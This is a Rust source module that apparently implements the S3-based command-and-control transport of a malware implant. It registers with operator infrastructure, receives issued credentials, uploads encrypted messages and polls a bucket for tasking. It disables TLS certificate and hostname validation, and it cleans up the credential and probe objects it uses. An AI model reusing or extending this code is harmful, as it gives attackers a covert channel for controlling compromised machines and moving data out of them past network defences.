use reqwest::blocking::Client;
use std::time::Duration;
use hmac::{Hmac, Mac};
use sha2::{Sha256, Digest};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use crate::config;
use crate::crypto;

type HmacSha256 = Hmac<Sha256>;

fn sha256_hex(data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(data);
    hex::encode(hasher.finalize())
}

fn hmac_sha256(key: &[u8], msg: &[u8]) -> Vec<u8> {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key error");
    mac.update(msg);
    mac.finalize().into_bytes().to_vec()
}

fn signing_key(secret: &str, date_stamp: &str, region: &str) -> Vec<u8> {
    let k_date = hmac_sha256(format!("AWS4{}", secret).as_bytes(), date_stamp.as_bytes());
    let k_region = hmac_sha256(&k_date, region.as_bytes());
    let k_service = hmac_sha256(&k_region, b"s3");
    hmac_sha256(&k_service, b"aws4_request")
}

struct SignedHeaders {
    authorization: String,
    amz_date: String,
    content_sha256: String,
}

fn sign_request(
    method: &str,
    path: &str,
    query: &str,
    payload: &[u8],
    host: &str,
    content_type: Option<&str>,
    access_key: &str,
    secret_key: &str,
) -> SignedHeaders {
    let now = chrono::Utc::now();
    let amz_date = now.format("%Y%m%dT%H%M%SZ").to_string();
    let date_stamp = now.format("%Y%m%d").to_string();

    let content_sha256 = sha256_hex(payload);

    let mut headers: Vec<(String, String)> = vec![
        ("host".into(), host.into()),
        ("x-amz-content-sha256".into(), content_sha256.clone()),
        ("x-amz-date".into(), amz_date.clone()),
    ];
    if let Some(ct) = content_type {
        headers.push(("content-type".into(), ct.into()));
    }
    headers.sort_by(|a, b| a.0.cmp(&b.0));

    let canonical_headers: String = headers.iter()
        .map(|(k, v)| format!("{}:{}\n", k, v))
        .collect();
    let signed_headers: String = headers.iter()
        .map(|(k, _)| k.as_str())
        .collect::<Vec<_>>()
        .join(";");

    let canonical_request = format!(
        "{}\n{}\n{}\n{}\n{}\n{}",
        method, path, query, canonical_headers, signed_headers, content_sha256,
    );

    let credential_scope = format!("{}/{}/s3/aws4_request", date_stamp, config::s3_region);
    let string_to_sign = format!(
        "AWS4-HMAC-SHA256\n{}\n{}\n{}",
        amz_date, credential_scope, sha256_hex(canonical_request.as_bytes()),
    );

    let key = signing_key(secret_key, &date_stamp, config::s3_region);
    let signature = hex::encode(hmac_sha256(&key, string_to_sign.as_bytes()));

    let authorization = format!(
        "AWS4-HMAC-SHA256 Credential={}/{}, SignedHeaders={}, Signature={}",
        access_key, credential_scope, signed_headers, signature,
    );

    SignedHeaders { authorization, amz_date, content_sha256 }
}

fn s3_host() -> String {
    let endpoint = config::s3_endpoint;
    let host_part = endpoint
        .replace("https://", "")
        .replace("http://", "");
    format!("{}.{}", config::s3_bucket, host_part)
}

fn build_client() -> Result<Client, Box<dyn std::error::Error>> {
    Ok(Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .timeout(Duration::from_secs(30))
        .build()?)
}

/// Unified S3 request helper. Returns Ok(None) for 403/404, Ok(Some(data)) on success.
fn s3_op(
    method: &str,
    full_key: &str,
    data: &[u8],
    access_key: &str,
    secret_key: &str,
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let host = s3_host();
    let path = format!("/{}", full_key);
    let url = format!("https://{}/{}", host, full_key);

    let ct = if method == "PUT" { Some("application/octet-stream") } else { None };
    let signed = sign_request(method, &path, "", data, &host, ct, access_key, secret_key);
    let client = build_client()?;

    let builder = match method {
        "PUT" => client.put(&url)
            .body(data.to_vec())
            .header("Content-Type", "application/octet-stream"),
        "GET" => client.get(&url),
        "DELETE" => client.delete(&url),
        _ => return Err("unsupported method".into()),
    };

    let resp = builder
        .header("Authorization", &signed.authorization)
        .header("x-amz-date", &signed.amz_date)
        .header("x-amz-content-sha256", &signed.content_sha256)
        .header("Host", &host)
        .send()?;

    let status = resp.status().as_u16();
    if status == 403 || status == 404 {
        return Ok(None);
    }
    if !resp.status().is_success() {
        let body = resp.text().unwrap_or_default();
        return Err(format!("S3 {} failed ({}): {}", method, status, &body[..body.len().min(500)]).into());
    }
    Ok(Some(resp.bytes()?.to_vec()))
}

// ---------------------------------------------------------------------------
// Bootstrap Registration
// ---------------------------------------------------------------------------

pub fn register() -> Result<(), Box<dyn std::error::Error>> {
    let runtime_uuid = uuid::Uuid::new_v4().to_string();
    eprintln!("[REG] Registering with runtime UUID: {}", runtime_uuid);

    let bootstrap_ak = config::s3_bootstrap_access_key_id;
    let bootstrap_sk = config::s3_bootstrap_secret_access_key;
    let payload_prefix = config::s3_payload_prefix;

    // Encrypted Key Exchange: generate session key, encrypt with PSK
    let psk_b64 = config::AESPSK;
    let psk = if !psk_b64.is_empty() {
        Some(general_purpose::STANDARD.decode(psk_b64)?)
    } else {
        None
    };

    let req_body = if let Some(ref psk_bytes) = psk {
        // Generate random session key
        let mut session_key = vec![0u8; 32];
        getrandom::getrandom(&mut session_key).expect("failed to generate session key");

        // Store session key for later verification
        {
            let mut sk = config::SESSION_KEY.write().unwrap();
            *sk = session_key.clone();
        }

        // Encrypt session key with PSK
        let encrypted = crypto::encrypt_message(psk_bytes, &session_key);
        general_purpose::STANDARD.encode(&encrypted).into_bytes()
    } else {
        b"register".to_vec()
    };

    // PUT registration request
    let req_key = format!("register/{}/{}.req", payload_prefix, runtime_uuid);
    let result = s3_op("PUT", &req_key, &req_body, bootstrap_ak, bootstrap_sk)?;
    if result.is_none() {
        return Err("Registration PUT failed (403/404)".into());
    }
    eprintln!("[REG] Request sent, waiting for credentials...");

    // Poll for .creds file (up to ~5 minutes)
    let creds_key = format!("register/{}/{}.creds", payload_prefix, runtime_uuid);
    let mut creds_data = None;
    for _ in 0..60 {
        crate::helpers::idle();
        match s3_op("GET", &creds_key, b"", bootstrap_ak, bootstrap_sk)? {
            Some(data) => {
                creds_data = Some(data);
                break;
            }
            None => continue,
        }
    }

    let creds_data = creds_data.ok_or("Registration timed out waiting for credentials")?;
    let creds: Value = serde_json::from_slice(&creds_data)?;

    let exec_ak = creds.get("access_key_id")
        .and_then(|v| v.as_str())
        .ok_or("missing access_key_id in creds")?;
    let exec_sk = creds.get("secret_access_key")
        .and_then(|v| v.as_str())
        .ok_or("missing secret_access_key in creds")?;
    let exec_prefix = creds.get("exec_prefix")
        .and_then(|v| v.as_str())
        .ok_or("missing exec_prefix in creds")?;

    // Verify encrypted key exchange
    if psk.is_some() {
        let session_key = config::SESSION_KEY.read().unwrap();
        let expected_hash = sha256_hex(&session_key);
        let server_hash = creds.get("session_key_hash")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if expected_hash != server_hash {
            return Err("Encrypted key exchange verification failed".into());
        }
        eprintln!("[REG] Encrypted key exchange verified (AES-256-CBC + HMAC-SHA256)");
    }

    // Store exec credentials
    {
        let mut ak = config::S3_EXEC_ACCESS_KEY.write().unwrap();
        *ak = exec_ak.to_string();
    }
    {
        let mut sk = config::S3_EXEC_SECRET_KEY.write().unwrap();
        *sk = exec_sk.to_string();
    }
    {
        let mut prefix = config::S3_EXEC_PREFIX.write().unwrap();
        *prefix = exec_prefix.to_string();
    }

    // Delete the .creds file
    let _ = s3_op("DELETE", &creds_key, b"", bootstrap_ak, bootstrap_sk);

    // Verify exec credential propagation (IAM takes 5-15s)
    eprintln!("[REG] Waiting for IAM credential propagation...");
    let probe_key = format!("{}/ats/.probe", exec_prefix);
    let mut propagated = false;
    for _ in 0..12 {
        crate::helpers::idle();
        match s3_op("PUT", &probe_key, b"probe", exec_ak, exec_sk) {
            Ok(Some(_)) => {
                let _ = s3_op("DELETE", &probe_key, b"", exec_ak, exec_sk);
                propagated = true;
                break;
            }
            _ => continue,
        }
    }

    if !propagated {
        return Err("Exec credentials failed to propagate after 60s".into());
    }

    eprintln!("[REG] Registered successfully. Exec prefix: {}", exec_prefix);
    Ok(())
}

// ---------------------------------------------------------------------------
// Communication (uses exec credentials + optional encryption)
// ---------------------------------------------------------------------------

fn exec_creds() -> (String, String, String) {
    let ak = config::S3_EXEC_ACCESS_KEY.read().unwrap().clone();
    let sk = config::S3_EXEC_SECRET_KEY.read().unwrap().clone();
    let prefix = config::S3_EXEC_PREFIX.read().unwrap().clone();
    (ak, sk, prefix)
}

fn has_encryption() -> bool {
    let sk = config::SESSION_KEY.read().unwrap();
    !sk.is_empty()
}

fn encrypt_if_enabled(data: &[u8]) -> Vec<u8> {
    let sk = config::SESSION_KEY.read().unwrap();
    if sk.is_empty() {
        data.to_vec()
    } else {
        crypto::encrypt_message(&sk, data)
    }
}

fn decrypt_if_enabled(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let sk = config::SESSION_KEY.read().unwrap();
    if sk.is_empty() {
        Ok(data.to_vec())
    } else {
        crypto::decrypt_message(&sk, data)
            .map_err(|e| format!("Decryption failed: {}", e).into())
    }
}

pub fn send_and_receive(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    println!("[SENDING] {}", payload);

    let (ak, sk, prefix) = exec_creds();

    let uuid = config::UUID.read().unwrap();
    let full_msg = format!("{}{}", *uuid, payload);
    let encoded = general_purpose::STANDARD.encode(&full_msg);
    drop(uuid);

    // Encrypt if session key is set
    let send_data = encrypt_if_enabled(encoded.as_bytes());

    let msg_id = uuid::Uuid::new_v4().to_string();
    let ats_key = format!("{}/ats/{}.obj", prefix, msg_id);
    let sta_key = format!("{}/sta/{}.obj", prefix, msg_id);

    // Upload message
    s3_op("PUT", &ats_key, &send_data, &ak, &sk)?;

    // Poll for response
    loop {
        crate::helpers::idle();
        match s3_op("GET", &sta_key, b"", &ak, &sk)? {
            Some(data) => {
                let _ = s3_op("DELETE", &sta_key, b"", &ak, &sk);

                // Decrypt if encryption enabled
                let plaintext = decrypt_if_enabled(&data)?;
                let response_text = String::from_utf8(plaintext)?;

                // Decode: base64(uuid + json) -> skip 36-char UUID prefix
                if let Ok(raw_bytes) = general_purpose::STANDARD.decode(response_text.trim()) {
                    if let Ok(raw_str) = String::from_utf8(raw_bytes) {
                        if raw_str.len() > 36 {
                            let after_uuid = &raw_str[36..];
                            if after_uuid.trim_start().starts_with('{') {
                                println!("[RECEeved] {}", after_uuid);
                                return Ok(after_uuid.to_string());
                            }
                        }
                        println!("[RECEeved] {}", raw_str);
                        return Ok(raw_str);
                    }
                }

                // Fallback: raw JSON
                println!("[RECEeved] {}", response_text);
                return Ok(response_text);
            }
            None => continue,
        }
    }
}

pub fn send_and_receive_json(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    let response_text = send_and_receive(payload)?;
    let json: Value = serde_json::from_str(&response_text)?;
    Ok(json)
}
